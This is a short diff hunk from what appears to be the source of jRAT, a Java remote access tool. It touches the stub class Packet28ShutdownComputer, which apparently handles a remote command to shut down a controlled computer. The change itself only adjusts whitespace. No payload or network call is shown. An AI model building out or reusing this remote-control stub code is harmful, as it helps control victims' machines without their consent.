@@ -4,8 +4,7 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Constants;
 
-
-public class Packet28ShutdownComputer extends AbstractIncomingPacket{
+public class Packet28ShutdownComputer extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
